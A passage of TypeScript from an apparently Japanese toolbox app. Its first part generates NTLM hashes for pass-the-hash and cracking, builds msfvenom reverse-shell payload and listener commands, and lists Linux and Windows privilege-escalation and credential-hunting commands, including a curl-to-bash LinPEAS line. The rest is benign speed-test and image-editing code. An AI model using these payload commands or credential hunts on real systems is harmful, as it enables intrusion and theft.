  return tohex(a) + tohex(b) + tohex(c) + tohex(d);
}
function setupNtlmSub(): void {
  const inEl = document.getElementById("ntlm-input") as HTMLInputElement | null;
  const btn = document.getElementById("ntlm-run") as HTMLButtonElement | null;
  const out = document.getElementById("ntlm-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", () => {
    const v = inEl?.value || "";
    const utf16 = new Uint8Array(v.length * 2);
    for (let i = 0; i < v.length; i++) {
      const c = v.charCodeAt(i);
      utf16[i * 2] = c & 0xff;
      utf16[i * 2 + 1] = (c >> 8) & 0xff;
    }
    const ntlm = md4(utf16);
    const lm = "aad3b435b51404eeaad3b435b51404ee"; // 空 LM ハッシュ
    out.textContent =
      `NTLM           : ${ntlm}\n` +
      `空 LM:NTLM 形式 : ${lm}:${ntlm}\n` +
      `pass-the-hash  : -H ${ntlm}\n` +
      `hashcat -m 1000 : ${ntlm}\n` +
      `john --format=nt: ${ntlm}`;
  });
}

// ===== 💥 msfvenom テンプレート =====
function setupMsfvenomSub(): void {
  const plat = document.getElementById("msfv-plat") as HTMLSelectElement | null;
  const fmt = document.getElementById("msfv-fmt") as HTMLSelectElement | null;
  const host = document.getElementById("msfv-host") as HTMLInputElement | null;
  const port = document.getElementById("msfv-port") as HTMLInputElement | null;
  const btn = document.getElementById("msfv-run") as HTMLButtonElement | null;
  const out = document.getElementById("msfv-out") as HTMLPreElement | null;
  if (!btn || !out) return;
  btn.addEventListener("click", () => {
    const p = plat?.value || "windows";
    const f = fmt?.value || "exe";
    const h = host?.value || "10.10.14.1";
    const po = port?.value || "4444";
    const map: Record<string, string> = {
      windows: `windows/x64/meterpreter/reverse_tcp`,
      linux: `linux/x64/meterpreter/reverse_tcp`,
      osx: `osx/x64/meterpreter/reverse_tcp`,
      android: `android/meterpreter/reverse_tcp`,
      php: `php/meterpreter/reverse_tcp`,
      python: `python/meterpreter/reverse_tcp`,
      java: `java/jsp_shell_reverse_tcp`,
      cmd: `cmd/unix/reverse_bash`,
    };
    const payload = map[p];
    const ext = f;
    const cmd = `msfvenom -p ${payload} LHOST=${h} LPORT=${po} -f ${f} -o shell.${ext}`;
    const handler = `# msfconsole で待ち受け\nuse exploit/multi/handler\nset PAYLOAD ${payload}\nset LHOST ${h}\nset LPORT ${po}\nset ExitOnSession false\nrun -j`;
    out.textContent = `${cmd}\n\n${handler}`;
  });
}

// ===== 🪜 特権昇格 チェックリスト =====
const PRIVESC_LINUX = `# Linux Privilege Escalation チェックリスト

## 列挙基本
id; whoami; hostname; uname -a; cat /etc/os-release
sudo -l                     # sudo 可能なコマンド
groups                      # 所属グループ (docker, lxd, disk, video 等は要警戒)
cat /etc/passwd /etc/group  # ユーザ列挙
ls -la /home/*

## SUID / SGID / Capabilities
find / -perm -4000 -type f 2>/dev/null            # SUID
find / -perm -2000 -type f 2>/dev/null            # SGID
getcap -r / 2>/dev/null                            # File capabilities
→ GTFOBins で特権昇格可能なものを確認

## 書き込み可能ファイル / cron
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null | grep -E '/(etc|usr|var)/'
ls -la /etc/cron* /var/spool/cron/
cat /etc/crontab

## 環境変数 / PATH
env; cat /proc/self/environ
echo $PATH                                         # PATH に書き込み可能ディレクトリ?

## カーネル / ディストリ
uname -r; cat /etc/issue
searchsploit linux kernel <version>
DirtyCow / DirtyPipe / OverlayFS など

## サービス / プロセス
ps aux; ps -ef
ss -tunlp                   # 内部リスニングポート → ポートフォワード対象
systemctl list-units --type=service

## 認証情報の探索
grep -r -i 'password\\|passwd\\|secret\\|api[_-]?key' /var/www /opt /home 2>/dev/null
find / -name 'id_rsa*' -o -name 'authorized_keys' -o -name '.git-credentials' 2>/dev/null
cat ~/.bash_history ~/.viminfo ~/.ssh/known_hosts

## NFS / Docker
cat /etc/exports                                   # no_root_squash の export
docker ps; ls /var/run/docker.sock                 # docker グループ → ホスト乗っ取り

## 自動化ツール
LinPEAS:  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
LinEnum:  ./LinEnum.sh
linux-exploit-suggester.sh
pspy64    # cron / プロセス監視
`;
const PRIVESC_WINDOWS = `# Windows Privilege Escalation チェックリスト

## 基本情報
whoami /all
systeminfo
hostname
net users; net localgroup administrators
wmic qfe get HotFixID,InstalledOn   # 適用済みパッチ

## 権限 / トークン
whoami /priv         # SeImpersonatePrivilege → JuicyPotato/PrintSpoofer/RoguePotato
whoami /groups

## サービス / 弱パーミッション
sc query
sc qc <service>      # binPath をチェック
accesschk.exe -uwcqv "Authenticated Users" *  (sysinternals)
icacls "C:\\Program Files\\..."

## 書き込み可能パス / Unquoted Service Path
wmic service get name,displayname,pathname,startmode | findstr /v "C:\\Windows" | findstr /i "auto"
→ パスに空白があり引用符なし → 中間に exe を配置

## レジストリ
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated
reg query "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated
→ 両方 1 → msi で SYSTEM 取得

## 認証情報の探索
findstr /si password *.xml *.ini *.txt *.config *.ps1
dir /s *unattend* *sysprep* *answer* 2>nul
type C:\\Windows\\Panther\\Unattend.xml
cmdkey /list                                # 保存された認証情報
runas /savecred /user:admin cmd
reg query HKLM /f password /t REG_SZ /s

## スケジュールタスク / スタートアップ
schtasks /query /fo LIST /v
dir "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"

## カーネル exploit / LOLBAS
wmic os get Caption,Version,BuildNumber
→ Watson / Sherlock / WES-NG で missing patch を抽出
LOLBAS で certutil / bitsadmin / mshta / regsvr32 等を活用

## 自動化ツール
WinPEAS.exe / WinPEAS.bat
PowerUp.ps1 (Invoke-AllChecks)
Seatbelt.exe
SharpUp.exe
JAWS (powershell)
`;
function setupPrivescChecklistSub(): void {
  const sel = document.getElementById("pec-os") as HTMLSelectElement | null;
  const out = document.getElementById("pec-out") as HTMLPreElement | null;
  if (!sel || !out) return;
  const render = (): void => {
    out.textContent = sel.value === "windows" ? PRIVESC_WINDOWS : PRIVESC_LINUX;
  };
  sel.addEventListener("change", render);
  render();
}

// ===== 📶 スピードテスト =====

interface SpeedDownloadResultTS {
  bytes: number;
  time_ms: number;
  mbps: number;
  status: number;
  final_url: string;
}
interface SpeedUploadResultTS {
  bytes: number;
  time_ms: number;
  mbps: number;
  status: number;
}
interface SpeedPingResultTS {
  samples_ms: number[];
  success: number;
  failed: number;
  avg_ms: number;
  min_ms: number;
  max_ms: number;
  jitter_ms: number;
}

interface SpeedHistoryEntry {
  ts: number;
  dlMbps: number | null;
  ulMbps: number | null;
  pingMs: number | null;
  jitterMs: number | null;
  dlBytes: number | null;
}

const speedHistory: SpeedHistoryEntry[] = [];
let speedAutoTimer: number | null = null;
let speedRunning = false;

function drawSpeedChart(): void {
  const canvas = document.getElementById(
    "st-chart",
  ) as HTMLCanvasElement | null;
  if (!canvas) return;
  const dpr = window.devicePixelRatio || 1;
  const cssW = canvas.clientWidth || 900;
  const cssH = canvas.clientHeight || 240;
  if (canvas.width !== cssW * dpr || canvas.height !== cssH * dpr) {
    canvas.width = cssW * dpr;
    canvas.height = cssH * dpr;
  }
  const ctx = canvas.getContext("2d");
  if (!ctx) return;
  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
  const W = cssW;
  const H = cssH;
  ctx.clearRect(0, 0, W, H);
  const padL = 44,
    padR = 44,
    padT = 10,
    padB = 22;
  const plotW = W - padL - padR;
  const plotH = H - padT - padB;

  const data = speedHistory;
  if (data.length === 0) {
    ctx.fillStyle = "#a0a8b4";
    ctx.font = "12px sans-serif";
    ctx.textAlign = "center";
    ctx.fillText("データなし — 「テスト実行」を押してください", W / 2, H / 2);
    return;
  }

  const mbpsValues: number[] = [];
  for (const e of data) {
    if (e.dlMbps != null) mbpsValues.push(e.dlMbps);
    if (e.ulMbps != null) mbpsValues.push(e.ulMbps);
  }
  const pingValues = data
    .map((e) => e.pingMs)
    .filter((v): v is number => v != null);
  const maxMbps = Math.max(10, ...mbpsValues) * 1.1;
  const maxPing = Math.max(50, ...pingValues) * 1.2;

  // grid
  ctx.strokeStyle = "#3a4150";
  ctx.lineWidth = 1;
  ctx.fillStyle = "#a0a8b4";
  ctx.font = "10px sans-serif";
  ctx.textAlign = "right";
  for (let i = 0; i <= 5; i++) {
    const y = padT + (plotH * i) / 5;
    ctx.beginPath();
    ctx.moveTo(padL, y);
    ctx.lineTo(padL + plotW, y);
    ctx.stroke();
    const mbps = maxMbps * (1 - i / 5);
    ctx.fillStyle = "#4ade80";
    ctx.fillText(mbps.toFixed(0), padL - 4, y + 3);
    const ping = maxPing * (1 - i / 5);
    ctx.fillStyle = "#f87171";
    ctx.textAlign = "left";
    ctx.fillText(ping.toFixed(0), padL + plotW + 4, y + 3);
    ctx.textAlign = "right";
  }

  // axis labels
  ctx.fillStyle = "#4ade80";
  ctx.textAlign = "left";
  ctx.fillText("Mbps", padL - 30, padT - 2);
  ctx.fillStyle = "#f87171";
  ctx.textAlign = "right";
  ctx.fillText("ms", padL + plotW + 26, padT - 2);

  const n = data.length;
  function xAt(i: number): number {
    if (n === 1) return padL + plotW / 2;
    return padL + (plotW * i) / (n - 1);
  }

  function plotLine(
    getter: (e: SpeedHistoryEntry) => number | null,
    color: string,
    max: number,
  ): void {
    const c = ctx!;
    c.strokeStyle = color;
    c.lineWidth = 2;
    c.beginPath();
    let started = false;
    for (let i = 0; i < n; i++) {
      const v = getter(data[i]);
      if (v == null) {
        started = false;
        continue;
      }
      const x = xAt(i);
      const y = padT + plotH * (1 - v / max);
      if (!started) {
        c.moveTo(x, y);
        started = true;
      } else c.lineTo(x, y);
    }
    c.stroke();
    c.fillStyle = color;
    for (let i = 0; i < n; i++) {
      const v = getter(data[i]);
      if (v == null) continue;
      const x = xAt(i);
      const y = padT + plotH * (1 - v / max);
      c.beginPath();
      c.arc(x, y, 2.5, 0, Math.PI * 2);
      c.fill();
    }
  }

  plotLine((e) => e.dlMbps, "#4ade80", maxMbps);
  plotLine((e) => e.ulMbps, "#60a5fa", maxMbps);
  plotLine((e) => e.pingMs, "#f87171", maxPing);

  // x-axis time labels
  ctx.fillStyle = "#a0a8b4";
  ctx.textAlign = "center";
  const ticks = Math.min(n, 6);
  for (let i = 0; i < ticks; i++) {
    const idx = Math.round(((n - 1) * i) / (ticks - 1 || 1));
    const e = data[idx];
    const x = xAt(idx);
    const d = new Date(e.ts);
    const lbl = `${String(d.getHours()).padStart(2, "0")}:${String(d.getMinutes()).padStart(2, "0")}:${String(d.getSeconds()).padStart(2, "0")}`;
    ctx.fillText(lbl, x, H - 6);
  }
}

function updateSpeedHistoryTable(): void {
  const tbody = document.querySelector(
    "#st-history tbody",
  ) as HTMLTableSectionElement | null;
  if (!tbody) return;
  const rows: string[] = [];
  for (let i = speedHistory.length - 1; i >= 0; i--) {
    const e = speedHistory[i];
    const t = new Date(e.ts).toLocaleTimeString();
    rows.push(
      `<tr><td style="padding:3px 4px">${t}</td>` +
        `<td style="padding:3px 4px;text-align:right;color:#1f883d">${e.dlMbps?.toFixed(2) ?? "—"}</td>` +
        `<td style="padding:3px 4px;text-align:right;color:#0969da">${e.ulMbps?.toFixed(2) ?? "—"}</td>` +
        `<td style="padding:3px 4px;text-align:right;color:#cf222e">${e.pingMs?.toFixed(1) ?? "—"}</td>` +
        `<td style="padding:3px 4px;text-align:right">${e.jitterMs?.toFixed(2) ?? "—"}</td>` +
        `<td style="padding:3px 4px;text-align:right">${e.dlBytes?.toLocaleString() ?? "—"}</td></tr>`,
    );
  }
  tbody.innerHTML = rows.join("");
}

async function runSpeedtestOnce(statusEl: HTMLElement | null): Promise<void> {
  if (speedRunning) return;
  speedRunning = true;
  const presetEl = document.getElementById(
    "st-dl-preset",
  ) as HTMLSelectElement | null;
  const dlUrlEl = document.getElementById(
    "st-dl-url",
  ) as HTMLInputElement | null;
  const ulUrlEl = document.getElementById(
    "st-ul-url",
  ) as HTMLInputElement | null;
  const pingHostEl = document.getElementById(
    "st-ping-host",
  ) as HTMLInputElement | null;
  const pingPortEl = document.getElementById(
    "st-ping-port",
  ) as HTMLInputElement | null;
  const pingCountEl = document.getElementById(
    "st-ping-count",
  ) as HTMLInputElement | null;
  const capEl = document.getElementById("st-cap") as HTMLSelectElement | null;
  const ulSizeEl = document.getElementById(
    "st-ul-size",
  ) as HTMLSelectElement | null;
  const statDl = document.getElementById("st-stat-dl");
  const statUl = document.getElementById("st-stat-ul");
  const statPing = document.getElementById("st-stat-ping");
  const statJitter = document.getElementById("st-stat-jitter");

  const dlUrl =
    presetEl?.value === "custom"
      ? dlUrlEl?.value.trim() || ""
      : presetEl?.value || "";
  const ulUrl = ulUrlEl?.value.trim() || "";
  const pingHost = pingHostEl?.value.trim() || "";
  const pingPort = parseInt(pingPortEl?.value || "443");
  const pingCount = parseInt(pingCountEl?.value || "5");
  const capMb = parseInt(capEl?.value || "10");
  const ulSizeMb = parseInt(ulSizeEl?.value || "2");

  const entry: SpeedHistoryEntry = {
    ts: Date.now(),
    dlMbps: null,
    ulMbps: null,
    pingMs: null,
    jitterMs: null,
    dlBytes: null,
  };

  try {
    if (pingHost) {
      if (statusEl)
        statusEl.textContent = `Ping ${pingHost}:${pingPort} ×${pingCount}…`;
      try {
        const p = await invoke<SpeedPingResultTS>("speedtest_ping", {
          host: pingHost,
          port: pingPort,
          count: pingCount,
        });
        entry.pingMs = p.avg_ms;
        entry.jitterMs = p.jitter_ms;
        if (statPing) statPing.textContent = `${p.avg_ms.toFixed(1)} ms`;
        if (statJitter) statJitter.textContent = `${p.jitter_ms.toFixed(2)} ms`;
      } catch (e) {
        if (statusEl) statusEl.textContent = `Ping エラー: ${e}`;
      }
    }

    if (dlUrl) {
      if (statusEl)
        statusEl.textContent = `ダウンロードテスト中… (上限 ${capMb}MB)`;
      try {
        const d = await invoke<SpeedDownloadResultTS>("speedtest_download", {
          url: dlUrl,
          maxBytes: capMb * 1024 * 1024,
          timeoutMs: 30000,
        });
        entry.dlMbps = d.mbps;
        entry.dlBytes = d.bytes;
        if (statDl) statDl.textContent = `${d.mbps.toFixed(2)} Mbps`;
      } catch (e) {
        if (statusEl) statusEl.textContent = `Download エラー: ${e}`;
      }
    }

    if (ulUrl && ulSizeMb > 0) {
      if (statusEl)
        statusEl.textContent = `アップロードテスト中… (${ulSizeMb}MB)`;
      try {
        const u = await invoke<SpeedUploadResultTS>("speedtest_upload", {
          url: ulUrl,
          sizeBytes: ulSizeMb * 1024 * 1024,
          timeoutMs: 30000,
        });
        entry.ulMbps = u.mbps;
        if (statUl) statUl.textContent = `${u.mbps.toFixed(2)} Mbps`;
      } catch (e) {
        if (statusEl) statusEl.textContent = `Upload エラー: ${e}`;
      }
    }

    speedHistory.push(entry);
    if (speedHistory.length > 500) speedHistory.shift();
    drawSpeedChart();
    updateSpeedHistoryTable();
    if (statusEl) {
      const t = new Date(entry.ts).toLocaleTimeString();
      statusEl.textContent = `完了 ${t} — ↓${entry.dlMbps?.toFixed(2) ?? "—"} ↑${entry.ulMbps?.toFixed(2) ?? "—"} Mbps / ping ${entry.pingMs?.toFixed(1) ?? "—"}ms`;
    }
  } finally {
    speedRunning = false;
  }
}

// ========================================================================
// 🎨 画像スタジオ
// ========================================================================
function setupImageStudioTool(): void {
  setupImgStdCrop();
  setupImgStdFavicon();
  setupImgStdPalette();
  setupImgStdPlaceholder();
  setupImgStdSvg();
  setupImgStdMosaic();
}

function loadImageFromFile(f: File): Promise<HTMLImageElement> {
  return new Promise((resolve, reject) => {
    const url = URL.createObjectURL(f);
    const img = new Image();
    img.onload = () => {
      URL.revokeObjectURL(url);
      resolve(img);
    };
    img.onerror = (e) => {
      URL.revokeObjectURL(url);
      reject(e);
    };
    img.src = url;
  });
}

async function buildIco(canvases: HTMLCanvasElement[]): Promise<Blob> {
  const pngs = await Promise.all(
    canvases.map(
      (c) =>
        new Promise<ArrayBuffer>((res, rej) =>
          c.toBlob((b) => {
            if (!b) return rej(new Error("toBlob failed"));
            b.arrayBuffer().then(res).catch(rej);
          }, "image/png"),
        ),
    ),
  );
  const count = pngs.length;
  const headerSize = 6 + count * 16;
  const totalSize = headerSize + pngs.reduce((s, p) => s + p.byteLength, 0);
  const buf = new ArrayBuffer(totalSize);
  const view = new DataView(buf);
  view.setUint16(0, 0, true);
  view.setUint16(2, 1, true);
  view.setUint16(4, count, true);
  let offset = headerSize;
  for (let i = 0; i < count; i++) {
    const c = canvases[i];
    const png = pngs[i];
    const entry = 6 + i * 16;
    view.setUint8(entry + 0, c.width >= 256 ? 0 : c.width);
    view.setUint8(entry + 1, c.height >= 256 ? 0 : c.height);
    view.setUint8(entry + 2, 0);
    view.setUint8(entry + 3, 0);
    view.setUint16(entry + 4, 1, true);
    view.setUint16(entry + 6, 32, true);
    view.setUint32(entry + 8, png.byteLength, true);
    view.setUint32(entry + 12, offset, true);
    new Uint8Array(buf, offset, png.byteLength).set(new Uint8Array(png));
    offset += png.byteLength;
  }
  return new Blob([buf], { type: "image/x-icon" });
}

function downloadBlob(blob: Blob, filename: string): void {
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 1000);
}

function downloadCanvas(
  canvas: HTMLCanvasElement,
  type: string,
  quality: number,
  filename: string,
): void {
  canvas.toBlob(
    (blob) => {
      if (!blob) return;
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      a.remove();
      setTimeout(() => URL.revokeObjectURL(url), 1000);
    },
    type,
    quality,
  );
}

function setupImgStdEditor(): void {
  const fileEl = document.getElementById(
    "imgstd-file",
  ) as HTMLInputElement | null;
  const wEl = document.getElementById("imgstd-w") as HTMLInputElement | null;
  const hEl = document.getElementById("imgstd-h") as HTMLInputElement | null;
  const keepEl = document.getElementById(
    "imgstd-keep",
  ) as HTMLInputElement | null;
  const rotEl = document.getElementById(
    "imgstd-rot",
  ) as HTMLSelectElement | null;
  const flipHEl = document.getElementById(
    "imgstd-flipH",
  ) as HTMLInputElement | null;
  const flipVEl = document.getElementById(
    "imgstd-flipV",
  ) as HTMLInputElement | null;
  const brightEl = document.getElementById(
    "imgstd-bright",
  ) as HTMLInputElement | null;
  const contrastEl = document.getElementById(
    "imgstd-contrast",
  ) as HTMLInputElement | null;
  const satEl = document.getElementById(
    "imgstd-sat",
  ) as HTMLInputElement | null;
  const hueEl = document.getElementById(
    "imgstd-hue",
  ) as HTMLInputElement | null;
  const blurEl = document.getElementById(
    "imgstd-blur",
  ) as HTMLInputElement | null;
  const fxEl = document.getElementById("imgstd-fx") as HTMLSelectElement | null;
  const wmEl = document.getElementById("imgstd-wm") as HTMLInputElement | null;
  const wmPosEl = document.getElementById(
    "imgstd-wm-pos",
  ) as HTMLSelectElement | null;
  const wmSizeEl = document.getElementById(
    "imgstd-wm-size",
  ) as HTMLInputElement | null;
  const wmColorEl = document.getElementById(
    "imgstd-wm-color",
  ) as HTMLInputElement | null;
  const wmOpEl = document.getElementById(
    "imgstd-wm-op",
  ) as HTMLInputElement | null;
  const applyBtn = document.getElementById(
    "imgstd-apply",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById("imgstd-status");
  const canvas = document.getElementById(
    "imgstd-canvas",
  ) as HTMLCanvasElement | null;
  if (!fileEl || !canvas) return;

  let srcImg: HTMLImageElement | null = null;
  let aspect = 1;

  const updateRangeLabels = (): void => {
    const map: Array<[HTMLInputElement | null, string]> = [
      [brightEl, "imgstd-bright-v"],
      [contrastEl, "imgstd-contrast-v"],
      [satEl, "imgstd-sat-v"],
      [hueEl, "imgstd-hue-v"],
      [blurEl, "imgstd-blur-v"],
    ];
    for (const [el, id] of map) {
      const v = document.getElementById(id);
      if (el && v) v.textContent = el.value;
    }
  };

  const render = (): void => {
    if (!srcImg) return;
    let w = parseInt(wEl?.value || "0", 10) || srcImg.naturalWidth;
    let h = parseInt(hEl?.value || "0", 10) || srcImg.naturalHeight;
    if (keepEl?.checked) {
      if (wEl && document.activeElement === wEl) h = Math.round(w / aspect);
      else if (hEl && document.activeElement === hEl)
        w = Math.round(h * aspect);
    }
    const rot = parseInt(rotEl?.value || "0", 10);
    const cw = rot === 90 || rot === 270 ? h : w;
    const ch = rot === 90 || rot === 270 ? w : h;
    canvas.width = cw;
    canvas.height = ch;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    const filters: string[] = [];
    filters.push(`brightness(${brightEl?.value || 100}%)`);
    filters.push(`contrast(${contrastEl?.value || 100}%)`);
    filters.push(`saturate(${satEl?.value || 100}%)`);
    filters.push(`hue-rotate(${hueEl?.value || 0}deg)`);
    if (parseInt(blurEl?.value || "0", 10) > 0)
      filters.push(`blur(${blurEl?.value}px)`);
    const fx = fxEl?.value || "none";
    if (fx === "grayscale") filters.push("grayscale(100%)");
    else if (fx === "sepia") filters.push("sepia(100%)");
    else if (fx === "invert") filters.push("invert(100%)");
    ctx.save();
    ctx.clearRect(0, 0, cw, ch);
    ctx.filter = filters.join(" ");
    ctx.translate(cw / 2, ch / 2);
    ctx.rotate((rot * Math.PI) / 180);
    ctx.scale(flipHEl?.checked ? -1 : 1, flipVEl?.checked ? -1 : 1);
    ctx.drawImage(srcImg, -w / 2, -h / 2, w, h);
    ctx.restore();
    const wmText = wmEl?.value || "";
    if (wmText) {
      const size = parseInt(wmSizeEl?.value || "24", 10);
      const op = parseInt(wmOpEl?.value || "80", 10) / 100;
      ctx.save();
      ctx.globalAlpha = op;
      ctx.fillStyle = wmColorEl?.value || "#fff";
      ctx.font = `bold ${size}px sans-serif`;
      ctx.textBaseline = "alphabetic";
      const m = ctx.measureText(wmText);
      const pad = Math.max(8, size * 0.4);
      const pos = wmPosEl?.value || "br";
      let x = cw - m.width - pad,
        y = ch - pad;
      if (pos === "bl") {
        x = pad;
        y = ch - pad;
      } else if (pos === "tr") {
        x = cw - m.width - pad;
        y = size + pad;
      } else if (pos === "tl") {
        x = pad;
        y = size + pad;
      } else if (pos === "center") {
        x = (cw - m.width) / 2;
        y = ch / 2;
      }
      ctx.fillText(wmText, x, y);
      ctx.restore();
    }
    if (statusEl) statusEl.textContent = `${cw}×${ch} — ${filters.join(" ")}`;
  };

  fileEl.addEventListener("change", async () => {
    const f = fileEl.files?.[0];
    if (!f) return;
    try {
      srcImg = await loadImageFromFile(f);
      aspect = srcImg.naturalWidth / srcImg.naturalHeight;
      if (wEl) wEl.value = String(srcImg.naturalWidth);
      if (hEl) hEl.value = String(srcImg.naturalHeight);
      render();
    } catch {
      if (statusEl) statusEl.textContent = "画像の読み込みに失敗しました";
    }
  });

  [brightEl, contrastEl, satEl, hueEl, blurEl].forEach((el) =>
    el?.addEventListener("input", updateRangeLabels),
  );
  [
    wEl,
    hEl,
    keepEl,
    rotEl,
    flipHEl,
    flipVEl,
    brightEl,
    contrastEl,
    satEl,
    hueEl,
    blurEl,
    fxEl,
    wmEl,
    wmPosEl,
    wmSizeEl,
    wmColorEl,
    wmOpEl,
  ].forEach((el) =>
    el?.addEventListener("input", () => {
      updateRangeLabels();
      render();
    }),
  );
  applyBtn?.addEventListener("click", () => {
    updateRangeLabels();
    render();
  });
  updateRangeLabels();
}

function setupImgStdCrop(): void {
  const fileEl = document.getElementById(
    "imgstd-crop-file",
  ) as HTMLInputElement | null;
  const ratioEl = document.getElementById(
    "imgstd-crop-ratio",
  ) as HTMLSelectElement | null;
  const fitEl = document.getElementById(
    "imgstd-crop-fit",
  ) as HTMLSelectElement | null;
  const bgEl = document.getElementById(
    "imgstd-crop-bg",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById(
    "imgstd-crop-run",
  ) as HTMLButtonElement | null;
  const dlBtn = document.getElementById(
    "imgstd-crop-dl",
  ) as HTMLButtonElement | null;
  const canvas = document.getElementById(
    "imgstd-crop-canvas",
  ) as HTMLCanvasElement | null;
  if (!fileEl || !canvas) return;
  let img: HTMLImageElement | null = null;

  const run = (): void => {
    if (!img) return;
    const [rwS, rhS] = (ratioEl?.value || "1:1").split(":");
    const rw = parseInt(rwS, 10);
    const rh = parseInt(rhS, 10);
    const longSide = Math.max(img.naturalWidth, img.naturalHeight);
    let outW: number, outH: number;
    if (rw >= rh) {
      outW = longSide;
      outH = Math.round((longSide * rh) / rw);
    } else {
      outH = longSide;
      outW = Math.round((longSide * rw) / rh);
    }
    canvas.width = outW;
    canvas.height = outH;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    ctx.fillStyle = bgEl?.value || "#000";
    ctx.fillRect(0, 0, outW, outH);
    const fit = fitEl?.value || "cover";
    const sAr = img.naturalWidth / img.naturalHeight;
    const dAr = outW / outH;
    let dw: number, dh: number, dx: number, dy: number;
    if (fit === "cover") {
      if (sAr > dAr) {
        dh = outH;
        dw = dh * sAr;
        dx = (outW - dw) / 2;
        dy = 0;
      } else {
        dw = outW;
        dh = dw / sAr;
        dx = 0;
        dy = (outH - dh) / 2;
      }
    } else {
      if (sAr > dAr) {
        dw = outW;
        dh = dw / sAr;
        dx = 0;
        dy = (outH - dh) / 2;
      } else {
        dh = outH;
        dw = dh * sAr;
        dx = (outW - dw) / 2;
        dy = 0;
      }
    }
    ctx.drawImage(img, dx, dy, dw, dh);
    if (dlBtn) dlBtn.disabled = false;
  };

  fileEl.addEventListener("change", async () => {
    const f = fileEl.files?.[0];
    if (!f) return;
    try {
      img = await loadImageFromFile(f);
      run();
    } catch {
      /* ignore */
    }
  });
  runBtn?.addEventListener("click", run);
  dlBtn?.addEventListener("click", () => {
    const r = (ratioEl?.value || "1-1").replace(":", "x");
    downloadCanvas(canvas, "image/png", 1, `crop_${r}.png`);
  });
}

function setupImgStdFavicon(): void {
  const fileEl = document.getElementById(
    "imgstd-fav-file",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById(
    "imgstd-fav-run",
  ) as HTMLButtonElement | null;
  const outEl = document.getElementById("imgstd-fav-out");
  if (!fileEl || !runBtn || !outEl) return;
  const sizes = [16, 32, 48, 64, 128, 180, 192, 256, 512];
  let img: HTMLImageElement | null = null;
  fileEl.addEventListener("change", async () => {
    const f = fileEl.files?.[0];
    if (!f) return;
    try {
      img = await loadImageFromFile(f);
    } catch {
      /* ignore */
    }
  });
  runBtn.addEventListener("click", () => {
    if (!img) {
      outEl.textContent = "先に画像を選択してください";
      return;
    }
    outEl.innerHTML = "";
    const canvases: HTMLCanvasElement[] = [];
    for (const s of sizes) {
      const c = document.createElement("canvas");
      c.width = s;
      c.height = s;
      const ctx = c.getContext("2d");
      if (!ctx) continue;
      ctx.imageSmoothingQuality = "high";
      ctx.drawImage(img, 0, 0, s, s);
      canvases.push(c);
      const wrap = document.createElement("div");
      wrap.style.cssText =
        "display:flex;flex-direction:column;align-items:center;gap:4px;font-size:11px;opacity:0.85";
      wrap.appendChild(c);
      const label = document.createElement("span");
      label.textContent = `${s}×${s}`;
      wrap.appendChild(label);
      const btn = document.createElement("button");
      btn.type = "button";
      btn.className = "toolbox-secondary";
      btn.textContent = "DL";
      btn.addEventListener("click", () => {
        void buildIco([c]).then((blob) =>
          downloadBlob(blob, `favicon-${s}.ico`),
        );
      });
      wrap.appendChild(btn);
      outEl.appendChild(wrap);
    }
    // 全サイズまとめて ICO
    const allBtn = document.createElement("button");
    allBtn.type = "button";
    allBtn.className = "toolbox-primary";
    allBtn.textContent = "全サイズ ICO でDL";
    allBtn.style.cssText = "margin-top:8px;width:100%";
    allBtn.addEventListener("click", () => {
      void buildIco(canvases).then((blob) =>
        downloadBlob(blob, "favicon.ico"),
      );
    });
    outEl.appendChild(allBtn);
  });
}

function setupImgStdPalette(): void {
  const fileEl = document.getElementById(
    "imgstd-pal-file",
  ) as HTMLInputElement | null;
  const nEl = document.getElementById(
    "imgstd-pal-n",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById(
    "imgstd-pal-run",
  ) as HTMLButtonElement | null;
  const outEl = document.getElementById("imgstd-pal-out");
  if (!fileEl || !runBtn || !outEl) return;
  let img: HTMLImageElement | null = null;
  fileEl.addEventListener("change", async () => {
    const f = fileEl.files?.[0];
    if (!f) return;
    try {
      img = await loadImageFromFile(f);
    } catch {
      /* ignore */
    }
  });
  runBtn.addEventListener("click", () => {
    if (!img) {
      outEl.textContent = "先に画像を選択してください";
      return;
    }
    const n = Math.max(2, Math.min(16, parseInt(nEl?.value || "6", 10)));
    const sample = 100;
    const c = document.createElement("canvas");
    const ar = img.naturalWidth / img.naturalHeight;
    c.width = sample;
    c.height = Math.max(1, Math.round(sample / ar));
    const ctx = c.getContext("2d");
    if (!ctx) return;
    ctx.drawImage(img, 0, 0, c.width, c.height);
    const data = ctx.getImageData(0, 0, c.width, c.height).data;
    // bucket by quantizing to 4 bits per channel
    const buckets: Record<
      string,
      { r: number; g: number; b: number; n: number }
    > = {};
    for (let i = 0; i < data.length; i += 4) {
      const a = data[i + 3];
      if (a < 128) continue;
      const r = data[i],
        g = data[i + 1],
        b = data[i + 2];
      const key = `${r >> 4}-${g >> 4}-${b >> 4}`;
      const bk = buckets[key];
      if (bk) {
        bk.r += r;
        bk.g += g;
        bk.b += b;
        bk.n++;
      } else buckets[key] = { r, g, b, n: 1 };
    }
    const sorted = Object.values(buckets)
      .sort((a, b) => b.n - a.n)
      .slice(0, n);
    outEl.innerHTML = "";
    const row = document.createElement("div");
